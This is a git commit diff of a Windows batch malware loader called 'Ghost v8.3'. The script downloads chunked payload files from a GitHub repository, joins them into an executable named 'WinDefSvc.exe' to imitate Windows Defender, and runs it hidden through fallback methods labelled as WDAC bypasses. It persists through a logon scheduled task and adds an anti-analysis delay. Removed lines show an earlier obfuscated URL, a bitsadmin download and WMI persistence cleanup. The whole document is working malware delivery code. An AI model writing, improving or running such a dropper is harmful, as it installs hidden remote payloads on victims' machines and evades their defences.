5f1dbbb70b262565eb9aef90e9d5494cd5520460
sophieduval <sophie.duval@serverinfo.legal>
2026-02-05 11:00:43 +0000

    Ghost v8.3 - Stable delivery with fallbacks

--- delivery_v8.bat
+++ delivery_v8.bat
@@ -1,45 +1,56 @@
 @echo off
-:: v8.1 - Obfuscated Delivery
 setlocal enabledelayedexpansion
 
-:: Obfuscated variables
-set "a=h" & set "b=t" & set "c=t" & set "d=p" & set "e=s"
-set "f=:" & set "g=/" & set "h=/" & set "i=r" & set "j=a" & set "k=w"
-set "l=." & set "m=g" & set "n=i" & set "o=t" & set "p=h" & set "q=u"
-set "r=b" & set "s=u" & set "t=s" & set "u=e" & set "v=r" & set "w=c"
-set "x=o" & set "y=n" & set "z=t" & set "aa=e" & set "ab=n" & set "ac=t"
-set "repo=!a!!b!!c!!d!!e!!f!!g!!h!!i!!j!!k!!l!!m!!n!!o!!p!!q!!r!!s!!t!!u!!v!!w!!x!!y!!z!!aa!!ab!!ac!.com/sophieduval/der/main"
+:: Ghost Loader v8.3 - WDAC Bypass Edition
+:: Uses multiple execution fallbacks
 
-set "bd=%LOCALAPPDATA%"
-set "bn=WinDefSvc"
-set "tf=%bd%\%bn%"
+set "repo=https://raw.githubusercontent.com/sophieduval/der/main"
+set "dest=%LOCALAPPDATA%\WinDefSvc"
+set "exe=WinDefSvc.exe"
 
-:: Delay (obfuscated ping)
-for /l %%x in (1,1,10) do (ping -n 2 127.0.0.1 >nul 2>&1)
+:: Anti-analysis delay
+ping -n 8 127.0.0.1 >nul 2>&1
 
-if not exist "%tf%" md "%tf%" 2>nul
-cd /d "%tf%"
+:: Create directory
+if not exist "%dest%" mkdir "%dest%" 2>nul
+cd /d "%dest%"
 
-:: Download using bitsadmin (alternative LOLBAS)
+:: Download chunks
+echo Initializing...
 for /l %%i in (0,1,10) do (
-    set "x=%%i"
-    if %%i LSS 10 set "x=0%%i"
-    set "fn=blob_!x!.dat"
+    set "idx=%%i"
+    if %%i LSS 10 set "idx=0%%i"
+    set "fn=blob_!idx!.dat"
     if not exist "!fn!" (
-        bitsadmin /transfer "j%%i" /priority high "!repo!/!fn!" "%tf%\!fn!" >nul 2>&1
+        powershell -Command "$wc=New-Object System.Net.WebClient; $wc.DownloadFile('%repo%/!fn!','%dest%\!fn!')" 2>nul
     )
 )
 
-:: Reassemble with obfuscated copy
-set "out=WinDefSvc.exe"
-copy /b blob_00.dat+blob_01.dat+blob_02.dat+blob_03.dat+blob_04.dat+blob_05.dat+blob_06.dat+blob_07.dat+blob_08.dat+blob_09.dat+blob_10.dat "%out%" >nul 2>&1
+:: Verify
+if not exist "blob_00.dat" exit /b 1
 
-:: Persistence via WMI (alternative to schtasks)
-wmic /namespace:\\root\subscription path __EventFilterToConsumerBinding delete >nul 2>&1
-wmic /namespace:\\root\subscription path CommandLineEventConsumer delete >nul 2>&1
-wmic /namespace:\\root\subscription path __EventFilter delete >nul 2>&1
+:: Reassemble
+copy /b blob_00.dat+blob_01.dat+blob_02.dat+blob_03.dat+blob_04.dat+blob_05.dat+blob_06.dat+blob_07.dat+blob_08.dat+blob_09.dat+blob_10.dat "%exe%" >nul 2>&1
 
-:: Execute silently
-start /b "" "%out%"
+:: Multi-method execution (WDAC bypass attempts)
+:: Method 1: Direct (standard)
+start "" "%exe%" 2>nul
+if %errorlevel%==0 goto :done
 
+:: Method 2: PowerShell Start-Process
+powershell -Command "Start-Process '%dest%\%exe%' -WindowStyle Hidden" 2>nul
+if %errorlevel%==0 goto :done
+
+:: Method 3: CMD /C wrapper
+cmd /c start "" "%exe%" 2>nul
+if %errorlevel%==0 goto :done
+
+:: Method 4: Explorer shell
+explorer "%exe%" 2>nul
+
+:done
+:: Persistence
+powershell -Command "$a=New-ScheduledTaskAction -Execute '%dest%\%exe%';$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName 'WinDefSvc' -Action $a -Trigger $t -Force" >nul 2>&1
+
+timeout /t 2 >nul
 exit
